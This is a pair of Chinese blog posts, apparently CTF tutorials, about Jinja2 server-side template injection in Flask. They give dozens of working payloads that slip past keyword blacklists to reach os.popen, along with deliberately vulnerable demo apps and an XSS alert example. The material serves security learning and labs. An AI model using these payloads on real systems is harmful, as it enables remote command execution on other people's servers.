[{"title":"flask中的ssti注入-绕过-有回显","path":"/2024/12/26/flask中的ssti注入-绕过-有回显/","content":"[TOC] 摘要这篇文章本身主要是讲解有回显情况下面针对ssti的过滤如何进行绕过（本篇文章的测试环境是python3.9.13）。 在我看来，面对黑名单过滤，最常用的就是两种，第一种是想方法绕过关键字的匹配还能使注入生效，第二种就是对方过滤不全，我们使用其他关键字进行代替来注入。我们这里主要提的是第一种。 我们先在这里给出我们上面一篇文章提出的一个基础的payload。 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;echo hello&#x27;).read()&#125;&#125; 绕过关键字的匹配字符串绕过如果被过滤的关键字是字符串，我们可以将他转换为其他形式，除了保证绕过对关键字的匹配外，同时我们注入的表达式也还要能够被正常解析。 举一个例子（这里os被过滤了）： 1234567891011121314151617181920212223242526272829303132from flask import Flask, request, render_template_stringimport htmlapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&quot;GET&quot;])def source(): with open(__file__, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: return &#x27;&lt;pre&gt;&#x27; + html.escape(f.read()) + &#x27;&lt;/pre&gt;&#x27;@app.route(&#x27;/&#x27;, methods=[&quot;POST&quot;])def Template(): template_code = request.form.get(&quot;code&quot;) print(template_code) # 安全过滤 blacklist = [&#x27;os&#x27;] for black in blacklist: if black in template_code: print(black) print(&quot;hacker!!!!&quot;) return &quot;hacker!!!&quot; result = render_template_string(template_code) print(result) return result def run_flask_app(): app.run(debug=False, host=&#x27;127.0.0.1&#x27;, port=5000)if __name__ == &quot;__main__&quot;: run_flask_app() 下面只会贴出各种方法的测试结果图。 16进制 8进制 unicode编码 上面这三个算是使用得比较多的，也确实是简单好用，我们只需要注意不同形式前面需要加上对应的前缀。这里可以格外留言一下8进制的这种形式，因为他转换之后不包含字母，这一点在过滤了所有字母的题中很有用。 unicode字符欺骗Python 3 开始支持非ASCII字符的标识符，也就是说，可以使用 Unicode 字符作为 Python 的变量名，函数名等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。 12𝐢𝐦𝐩𝐨𝐫𝐭 //unicode欺骗字符import //正常半角英文字符 测试结果： 一些小细节： 不是所有的相似unicode字符都能够被正常解析 某些 unicode 在遇到 lower() 函数时也会发生变换，因此碰到 lower()、upper() 这样的函数时要格外注意 我测试了一下只有当我们在一个函数里面调用另一个函数的时候（字符串形式），我们可以将函数名字进行替换来绕过，这时能够被正常解析，其他时候不能。（作者对于这方面也不是很了解，测试做得也不够多，这里如果说错了，还请谅解） 记得先url编码再张贴到bp中 建议一般情况下面不要使用这个方法，只有当英文全部被过滤时可以考虑。 给出一个相似unicode寻找网站：https://shapecatcher.com/unicode/block/Mathematical_Alphanumeric_Symbols 全角英文使用方式和unicode字符欺骗类似。 给出一个payload： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__ｉｍｐｏｒｔ__(&#x27;\\u006f\\u0073&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 我们修改上面测试代码，加上import过滤。 测试结果： 可以看到__ｉｍｐｏｒｔ__被成功解析了。**** base64编码（只限于python2环境）这里具体的flask环境我们就不搭建了，来看一下使用方法即可，这里主要是借助的字符串中的decode方法。 python3中字符串的decode方法已经被删除了。 将字符串进行混淆这里太多了，不放测试结果图了，直接给payload。 +拼接： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;+&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; //(&#x27;o&#x27;+&#x27;s&#x27;)=(&#x27;os&#x27;) 注意+在url传输中具有特殊含义，所以这里需要进行url编码。 ~拼接： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__[&#x27;__imp&#x27;~&#x27;ort__&#x27;](&#x27;o&#x27;~&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&#125;&#125; //[&#x27;__imp&#x27;~&#x27;ort__&#x27;](&#x27;o&#x27;~&#x27;s&#x27;)=[&#x27;__import__&#x27;](&#x27;os&#x27;) 有点奇怪，这个可以，但是上面那个+直接改成~却不行。 中间加上&#39;&#39;: 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; //(&#x27;o&#x27;&#x27;s&#x27;)=(&#x27;os&#x27;) 反转： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;so&#x27;[::-1]).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; //(&#x27;so&#x27;[::-1])=(&#x27;os&#x27;) 应该还有其他方法，这里就不再一一列举了。 使用函数进行字符串绕过这里太多了，不放测试结果图了，直接给payload。 replace函数： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;ot&#x27;.replace(&#x27;t&#x27;,&#x27;s&#x27;)).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; //(&#x27;ot&#x27;.replace(&#x27;t&#x27;,&#x27;s&#x27;))=(&#x27;os&#x27;) lower函数： 1&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;OS&#x27;.lower()).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; //(&#x27;OS&#x27;.lower())=(&#x27;os&#x27;) format函数： 123&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;&#123;0:c&#125;&#123;1:c&#125;&#x27;.format(111,115)).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125;&#123;0:c&#125;&#123;1:c&#125;&#x27;.format(111,115) //这里c表示将ascii编码转换为对应的ascii字符，一个&#123;&#125;代表一个占位符 join函数： 123&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;&#x27;.join([&#x27;o&#x27;,&#x27;s&#x27;])).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125;&#x27;&#x27;.join([&#x27;o&#x27;,&#x27;s&#x27;] //将[&#x27;o&#x27;,&#x27;s&#x27;]里面的元素以&#x27;&#x27;(也就是空格的方式) 字符串是一个对象，这里都是使用的字符串中的方法。应该还有其他方法，感兴趣的话，我们可以使用dir(&quot;&#39;&#39;.__class__)查看一下字符串还有什么方法，自己研究一下。 chr函数： 12&#123;% set chr = ().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(chr(111)+chr(115)).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 这个函数可以将ascii编码转换为对应的ascii字符。但是不是很推荐使用，因为这个函数是内置函数，不是字符串对象中的方法，也不在模版空间的全局变量中，我们还需要引入之后才能使用。 从chr这个函数的过滤思想出发，就是我们可以先将字符串转换为对应的形式，再借助python中对应的函数转换回来。显然在python中我们可以找到很多这种函数。 我再给出一个例子 bytes函数： 12&#123;% set bytes = ().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.bytes %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(bytes([111, 115]).decode()).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; bytes 函数可以接收一个 ascii 编码列表，然后转换为二进制字符串，再调用 decode 则可以得到字符串。 使用__doc__属性我们先来看一下这个属性的作用。 我们可以看到两个字符串的内容是完全一样的，也就是__doc__是用于储存对象的文档字符串的，获取字符串之后我们就可以通过获取字符串中对应的字符来拼接来进行绕过。 举一个例子： 123&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(().__doc__[34]+().__doc__[19]).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125;// ().__doc__[34]和().__doc__[19]就分别是o和s字符 其实如果过滤不严格的话，我们还可以直接： 12&#123;% set x = &quot;so&quot; %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__[&#x27;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__&#x27;](x[1]+x[0]).popen(&quot;echo hello&quot;).read()&#125;&#125; 但是这里需要注意的是，我们不能在eval函数中使用｛%%｝定义的变量，eval函数执行时使用的是全局命名空间和局部命名空间。具体可以看一下文档：https://docs.python.org/3/library/functions.html#eval 小结：到目前为止，不严谨的算的话，我们已经讲了10几种字符串绕过的方法了。其实我这里还可以讲更多，但是没有必要了，方法都是大同小异的，我们更多的是需要掌握一种如何去进行绕过的思想。 非字符串绕过从上面可以看到针对字符串过滤有非常多的绕过方法，如果我们能够将非字符串转换为字符串，那么我们就可以借助上面的方法进行绕过。我们这里增加一个针对__class__的过滤。 想方法将非字符串转换为字符串使用[]前面的payload可以转换为 1&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;].__base__[&#x27;__subclasses__&#x27;]()[412][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 注意： 12&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;].__base__&#125;&#125; //返回的是&lt;class object&gt;&#123;&#123;()[&#x27;__cla&#x27;&#x27;ss__&#x27;][&#x27;__base__&#x27;]&#125;&#125; //返回的是tuple[&#x27;__base__&#x27;] 这导致最后得到的子类不同，412超出了索引范围，然后我大概看了一下tuple[&#39;__base__&#39;]返回的子类，没发现什么可利用的。之前被坑过一次，但是这里我也不太清楚为什么返回结果不一样，不知道是否有师傅知道。因为后面有更简便的方法，可以不需要获取父类，所以这里就没有继续深究了。 使用[]也是绕过.的一种方法。 使用函数和过滤器getattr函数和attr过滤器 getattr函数可以获取对象的属性。 首先这个函数我们需要获取之后才能使用，其次这个函数使用起来也比较麻烦，因为他的调用方式是这样的getattr(obj,&#39;attribute&#39;)所以我们这里了解即可。 attr过滤器也可以获取对象的属性。但是attr是属于Jinja2模版空间的，我们可以结合管道符|直接使用，使用起来也更加方便。 1&#123;&#123;((()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[412]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;))[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 这里需要格外注意的是，如果返回对象的是一个列表或者字典，我们直接使用attr是不行的，如： 123&#123;&#123;()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()[412]&#125;&#125;&#123;&#123;((()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[412]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__builtins__&#x27;)&#125;&#125; 这个时候我们可以将返回的对象整体使用()包裹起来再使用[]进行访问，如： 123&#123;&#123;(()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[412]&#125;&#125;&#123;&#123;(((()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[412]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;))[&#x27;__builtins__&#x27;]&#125;&#125; 这样写的话，整个payload就过于复杂，容易出现错误，而且[]被过滤了的话，上面就无法绕过了。我们这里可以使用**__getitem__魔术方法，我们在使用[]来访问字典或者列表中的元素时就是在隐式地调这个方法**。 1&#123;&#123;()|attr(&#x27;__cla&#x27;&#x27;ss__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(412)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;eval&#x27;)(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 我们这里还可以使用pop方法来访问代码__getitem__，这个方法返回对应的元素时也会将元素从列表或者字典中删除，所以一般不推荐使用。 其中针对字典对象，我们还可以使用get方法和setdefault方法来获取字典中的元素。 还有使用**__dict__魔术属性，这个属性储存的是对象中的所有属性，以字典的形式，也就是我们使用他来访问属性还得使用[]，再加上他本身也带有下划线，所以这个方法比较鸡肋**。 vars函数，也可以使用来访问对象的属性，但是使用起来比较麻烦，这里权当记录一下。 想方法使用其他关键字进行代替非字符串中的关键字被过滤了，如果不转换为字符串形式，那么基本没有什么好的绕过方法。这个时候可以祈祷对方过滤不全，同时还可以寻找到其他具有类似功能的关键字进行代替。如__base__被过滤，我们还可以使用__mro__。 其实我们前面使用的payload都太长了，一方面是很容易踩到对方的黑名单，另一方面是手注的时候很容易出现错误，还不易察觉错误出现在哪里。所以我们一般是不使用上面这种payload的。我们可以进行精简。这也是使用其他关键字进行代替的一种思想，只要最终能够达到目的即可。 精简payload在精简之前，我们再分析一下我们的payload。 123456&#123;&#123;().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;echo hello&#x27;).read()&#125;&#125;__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;echo hello&#x27;).read()//这一段明显是不能省略的，首先我们要执行命令，执行命令不能省，其次我们要找到定义才能执行命令//所以找到定义也不能省，那么我们是怎么找到的定义，是通过获取一个类，再获取一个python写的函数，再获取的定义//那么我们能不能直接获取类或者函数，这样前面这一堆就可以省了 还记得我们上一篇文章提到的模板环境中的全局变量和上下文环境中的全局变量吗，这些全局变量中既有函数又有类，我们还可以在模版中直接使用，这不就极大精简了我们的payload吗。显然使用函数比使用类还要再精简一点，我们这里直接看一下模板环境中的全局变量函数lipsum()。 1&#123;&#123;lipsum[&#x27;__globals__&#x27;][&#x27;o&#x27;&#x27;s&#x27;][&#x27;popen&#x27;](&#x27;echo hello&#x27;).read()&#125;&#125; 这里为什么不需要使用__builtins__呢，因为lipsum是定义在utils.py文件中，而这个文件中导入了os模块，__globals__会直接返回函数所在py文件的全局变量，所以我们这里可以直接使用os模块。这个payload应该是最简单的应该payload之一了。 我们还可以使用上下文环境中的全局变量函数url_for()和函数get_flashed_messages()来代替lipsum函数，他们是定义在helpers.py文件中，这个文件同样导入了os模块。 关于函数就是这三个了，如果都被过滤了，优先考虑使用模板环境中的类，因为模板环境中的类也是定义在utils.py文件中，我们可以直接使用os模块。 两个引号被过滤了可以看到字符串绕过能力非常强，所以有的时候对方会直接将两个引号给过滤掉，让我们直接使用不了字符串。所以我们这里再总结一下引号被过滤了如何绕过。 使用chr函数，bytes函数和__doc__属性前面在讲解字符串绕过的时候已经提过，这里不再多讲，直接给payload。 先给出一个chr的脚本，方便转换，我一般是习惯使用+，因为我一般是在bp中再进行url编码。你这里也可以改为%2b。 123456789&lt;?php$a = &#x27;echo hello&#x27;;$result = &#x27;&#x27;;for($i=0;$i&lt;strlen($a);$i++)&#123; $result .= &#x27;chr(&#x27;.ord($a[$i]).&#x27;)+&#x27;;&#125;echo substr($result,0,-1);?&gt; 其实函数是可以直接访问__builtins__属性的，写一半才发现，不过影响也不大，前面就没有改了，我在前一篇文章末尾也已经说明了。 12&#123;% set chr = lipsum.__builtins__.chr %&#125;&#123;&#123;lipsum[chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95)][chr(111)+chr(115)][chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(101)+chr(99)+chr(104)+chr(111)+chr(32)+chr(104)+chr(101)+chr(108)+chr(108)+chr(111)).read()&#125;&#125; bytes的脚本 12345678910def convert_string_to_bytes_decode(input_string): byte_values = [ord(char) for char in input_string] byte_string = &#x27;, &#x27;.join(map(str, byte_values)) result = f&quot;bytes([&#123;byte_string&#125;]).decode()&quot; return result# 示例input_string = &#x27;os&#x27;converted_string = convert_string_to_bytes_decode(input_string)print(converted_string) # 输出: bytes([111, 115]).decode() 12&#123;% set bytes = lipsum.__builtins__.bytes %&#125;&#123;&#123;lipsum[bytes([95, 95, 103, 108, 111, 98, 97, 108, 115, 95, 95]).decode()][bytes([111, 115]).decode()][bytes([112, 111, 112, 101, 110]).decode()](bytes([101, 99, 104, 111, 32, 104, 101, 108, 108, 111]).decode()).read()&#125;&#125; __doc__属性这个直接看前面理解一下就行了。 使用request和session这个方法比上面要好，一方面这两个对象是上下文环境中的全局变量，可以直接使用；另一方面就是这两个使用起来更加清晰，不容易出错，发现错误也容易。直接看payload理解吧。 request 1&#123;&#123;lipsum[request.values.glo][request.values.so][request.values.po](request.values.pla).read()&#125;&#125;&amp;glo=__globals__&amp;so=os&amp;po=popen&amp;pla=echo+hello 我们这里还可以将请求参数写在cookie和请求头中。 这里在命名时需要小心，我之前使用pop=popen，但是pop这个名字比较常见，可能是导致了命名冲突，换了一个名字就好了。 session 这里session理论也是可以的，但是因为session需要开启才能使用，所以这里就不再测试了，了解即可。 借助过滤器和dict类12345678910&#123;% set gl = dict(__globals__=1)|join %&#125; &#123;% set so = dict(o=1,s=1)|join %&#125;&#123;% set po = dict(popen=1)|join %&#125; &#123;% set re = dict(read=1)|join %&#125;&#123;% set ge = dict(__getitem__=1)|join %&#125; &#123;%set space=&#123;&#125;|select()|string()|attr(ge)(10)%&#125;&#123;% set cmd1 = dict(echo=1)|join %&#125; &#123;% set cmd2 = dict(hello=1)|join %&#125; &#123;% set cmd = cmd1 ~ space ~ cmd2 %&#125; &#123;&#123; lipsum|attr(gl)|attr(ge)(so)|attr(po)(cmd)|attr(re)() &#125;&#125; 12&#123;% set a = dict(__globals__=1)|join %&#125; 这里set就是在定义变量,dict是一个内置类，这里是在创建一个实例对象，所以这里就变成了&#123;&#x27;__globals__&#x27;:1&#125;，|是用来传递结果的，join是Jinja2的过滤器，用于将序列中的元素连接成一个字符串，默认使用空字符串进行连接，也可以使用join()来指定连接符，这里会将字典的键名进行连接，所以最后就是相当于set a = &#x27;__globals__&#x27; 1234&#123;% set ge = dict(__getitem__=1)|join %&#125; &#123;%set space=&#123;&#125;|select()|string()|attr(ge)(10)%&#125;这里其实是在构造空格，select()也是一个过滤器，他会返回一个生成器对象，&lt;generator object select_or_reject at 0x0000027188A13760&gt;，string也是一个过滤器，将变量转换为字符串类，得到&quot;&lt;generator object select_or_reject at 0x0000027188A13760&gt;&quot;，然后我们就可以使用__getitem__方法来获取这个字符串中对应的字符，这里__getitem__(10)就是空格 借助过滤器的话，还有许多其他的方法，这里就不再一一讲解了。 数字绕过一般情况下面我们的payload是完全不需要数字的，毕竟简化之后的payload我们已经不需要通过列表的索引来获取类。但是当我们借助一些编码，函数，过滤器等去进行绕过的时候，这个时候的payload中就会包含数字了。 unicode字符欺骗参考前面字符串绕过中提到的。这个方法不推荐，测试了一下，效果不好，当然可能是我个人原因，所以这里先记录一下。我们在得到一些数字之后，借助加减乘除可以得到其他数字 借助过滤器12&#123;% set a = dict(e=a)|join|count %&#125; #1 count&#123;% set c = dict(e=a)|join|length %&#125; #1 length 借助函数或者方法ord函数 12&#123;% set ord = lipsum.__builtins__.ord %&#125;&#123;% set a = ord(&#x27;a&#x27;) %&#125; #97 index方法 1&#123;&#123;(&#x27;a&#x27;).index(&#x27;a&#x27;)&#125;&#125; #0 find方法 1&#123;&#123;&quot;abc&quot;.find(&#x27;c&#x27;)&#125;&#125; #2 差不多就是这两个方向，要么使用python中的函数，要么使用Jinja2中的过滤器。 然后得到数字之后，如何进行拼接，其实也存在着一定问题，但是这里就不再细讲了。如果有机会再补充吧。 一些有趣的绕过和知识长度绕过直接参考ctfshow单身杯ctf中ezzz__ssti的题解：https://ctf-show.feishu.cn/docx/R6udd58bxoQGQMxFphncZq8rn5e Jinja2语法标识绕过（要求存在原型链污染）简单来说，就是&#123;&#123;&#125;&#125;和&#123;%%&#125;这两种语法标识，如果存在原型链污染漏洞的话，我们是可以污染成我们自己设定的语法标识。具体可以参考这篇文章：https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIq7IYGIqYvAM4jOTbD#toc-13 未定义类的注入1&#123;&#123;x.__init__.__builtins__.eval(&quot;__\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074__(&#x27;o&#x27;&#x27;s&#x27;).popen(&#x27;echo hello&#x27;).read()&quot;)&#125;&#125; 这里x我们没有进行定义，这个时候的x属于runtime.py中的Undefined类，而且这个类还重写了__init__方法，所以我们这里直接就可以使用他来获取内置模块。 这个payload还是很神奇的，如果我们记不住模板环境和上下文环境中的关键字，或者他们被过滤的时候，我们就可以使用这个方法。这个也是无意间测试发现的，不知道是否有什么版本要求。 不要过分执着于命令执行命令执行的本质也是读取文件，获取信息。但是有的时候，信息可能没有藏在文件中，而是藏在python代码的某一个变量中，这个时候我们可以借助config或者其他去读取信息，不要过分执着于命令执行本身。 小结flask中的ssti有回显注入到这里就告一段落了，其实一开始写这一篇文章的时候是想着将无回显注入也写了，但是后面越写越长，就干脆分成两篇了。这篇文章有些地方讲得不一定准确，还请谅解。 这里再推荐两个靶场来进行练习巩固，一个是github上面的一个sstilabs，一个是ctfshow中的ssti注入专题，不过这个需要会员。 后面如果还有什么好玩的payload，会补充在文章末尾。 参考文章 references: ‘‘ ‘‘ ‘这个是讲解沙箱绕过的，但是两者有很多相通的地方‘ ‘这个是讲原型链污染的，讲得很全面，里面有讲到了对Jinja2语法标识的污染‘ ‘CTFshow 单身杯CTF 官方WP‘ ‘sstilabs‘ ‘ctfshow‘ …","tags":["ssti绕过","ssti有回显注入","小技巧"],"categories":["python","ssti","绕过","有回显"]},{"title":"flask中的ssti注入-前置基础知识","path":"/2024/12/23/flask中的ssti注入-前置基础知识/","content":"[TOC] 摘要为什么要写这一篇文章呢？一方面是是为了防止手注时出现错误不知如何进行更改，另一方面是后面讲得所有的利用和绕过都是在此基础上，只有对这方面有所了解，你才能理解后面的payload。（会讲得比较细致，适合零基础的小白）。不过为了尽可能精炼一点，这里对一些基础的概念不会进行讲解。 flask框架什么情况下面会产生ssti注入漏洞基础理解： flask是使用Jinja2模板引擎对数据进行渲染的，Jinja2主要是负责将网站的数据进行展示，而Jinja2是使用python语言写的，我们在进行数据渲染和展示的时候本质上调用的是Jinja2中的函数。当然Jinja2本身是一个安全的模板引擎，只不过在我们使用不当的时候就会产生漏洞。 在使用 Flask 进行模板渲染时，通常有两种方式，分别使用到两个函数：render_template 和 render_template_string。这两个函数都是 Flask 提供的便捷函数，它们对 Jinja2 中 Template类的 render 方法进行了封装，为我们提供了更加方便的使用接口。 所以这里我们先去看一下Template类中render方法的源码。 renderTemplate 类定义在 Jinja2 的 environment.py 文件中。 在render方法中调用了 self.root_render_func，也就是这个类中的根渲染函数。当我们去查看这个函数时，会发现这个函数并没有在类中显式定义，这是因为这个函数是在模板编译过程中动态生成的。 在底层，Jinja2 首先将模板源代码（包含 Jinja2 模板语法的前端代码）解析为抽象语法树（AST），然后将其转换为可执行的 Python 代码。在这个过程中，会生成 root_render_func 函数。在渲染时，调用这个函数，并将上下文数据传递给它，根据占位符进行渲染。 这个过程远比我这里讲述的要复杂得多。例如，在生成的 Python 函数中，会自动调用其他函数进行 HTML 转义，以防止 XSS 攻击。此外，如果我们传入的是一个字符串形式的 Python 表达式，Jinja2 并不会对这个表达式进行解析和执行，而是直接将其作为字符串进行渲染。 如果你了解过 Java 中的 JSP，你会更容易理解上述内容。Java 中的 JSP 页面在运行时会被转换为对应的 Java 代码，调用生成的 service 方法进行渲染。Jinja2 的工作原理与此类似。 这种设计方式可以减少对于模板源代码的解析，我们可以对生成的编程语言代码进行重复使用，还可以进行优化，这提高了渲染性能和运行效率，以及能够在编译的时候进行错误检查和安全检测等。 接下来我们看一下render_template和render_template_string这两个函数。 render_template 我们观察这个函数，可以看到这个函数接收两个参数，第一个参数是模板文件的名称，它可以是字符串也可以是列表，如果是列表，则只取列表中的第一个元素来加载模板；然后第二个参数是一个可变长度的关键字参数，我们可以传递多个关键字参数，这些参数会被打包成一个字典，在后面将模板源代码转换为python代码时，我们就是通过对应的键名来获取对应的键值从而进行渲染。然后这里进行渲染是又调用了_render函数。 我们再来看一下_render函数源码。 我们可以看到这里rv = template.render(context)，这里template就是Template类的实例对象，也就是我们程序中的实际模板文件，render就是Template类中的render方法，我们前面已经分析过了。 整个渲染过程就比较清晰了。 templating.py#render_template() -&gt; templating.py#_render() -&gt; environment.py#Template#render() -&gt; environment.py#Template#root_render_func() 我们现在来看一个具体使用的例子。 先创建一个templates文件夹，再创建一个模板文件1.html放在里面，文件内容如下： 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;hello, &#123;&#123;name&#125;&#125;!&lt;br&gt;welcome to &#123;&#123;address&#125;&#125;!&lt;/body&gt;&lt;/html&gt; 再在templates同级目录下面创建一个py文件，内容如下： 123456789101112from flask import Flask, render_templatefrom jinja2 import Templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def home(): rendered = render_template(&quot;1.html&quot;,name=&quot;xwx&quot;,address=&quot;guangzhou&quot;) return renderedif __name__ == &#x27;__main__&#x27;: app.run(debug=True) 运行之后，就能够在浏览器看到输出。 12hello, xwx!welcome to guangzhou! 我们可以这这里分别使用这两个参数测试一下，能不能将我们注入的xss代码和python代码进行解析。 123name = &quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;address = &quot;().__class__&quot;rendered = render_template(&quot;1.html&quot;,name=name,address=address) 得到的输出是： 12hello, &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;!welcome to ().__class__! 可以看到两个都没有解析，都是直接输出的，因为我们已经分析过了render_template函数调到最后其实调的就是root_render_func函数，而这个函数是动态生成的，他会进行安全处理，所以我们的xss攻击和ssti注入失效了。 render_template_string 可以看到，这个函数接收两个参数，一个是整个模板源代码组成的字符串，一个是可变参数，后面进行模板渲染的，最后也是调用了_render函数。所以这个函数正常使用也是安全的。 我们来举一个例子测试一下。 1234567891011121314151617181920212223242526from flask import Flask, render_template, render_template_stringfrom jinja2 import Templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def home(): html = &quot;&quot;&quot;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;hello, &#123;&#123;name&#125;&#125;!&lt;br&gt;welcome to &#123;&#123;address&#125;&#125;!&lt;/body&gt;&lt;/html&gt; &quot;&quot;&quot; name = &quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot; address = &quot;().__class__&quot; rendered = render_template_string(html,name=name,address=address) return renderedif __name__ == &#x27;__main__&#x27;: app.run(debug=True) 直接运行之后，打开浏览器，发现并没有将两个攻击解析。 那么一般这个漏洞是出现在什么地方呢？其实这个漏洞和Jinja2本身无关，大多数时候就是程序员粗心大意造成的。因为后面需要渲染的参数其实是可以省略的，有的程序员会在前面直接将需要渲染的参数和模板源代码进行拼接，最后就传递一个模板源代码的字符串给渲染函数，这个时候就会出现漏洞。 举一个例子： 123456789101112131415161718192021222324252627282930from flask import Flask, render_template, render_template_stringfrom jinja2 import Templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def home(): html = &quot;&quot;&quot;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;hello, &#123;0&#125;!&lt;br&gt;welcome to &#123;1&#125;!&lt;/body&gt;&lt;/html&gt; &quot;&quot;&quot; name = &quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot; address = &quot;&#123;&#123;().__class__&#125;&#125;&quot; html = html.format(name, address) print(html) rendered = render_template_string(html) return renderedif __name__ == &#x27;__main__&#x27;: app.run(debug=True) 这个时候，我们运行而且打开浏览器，就会收到弹窗，而且看到 12hello, !welcome to &lt;class 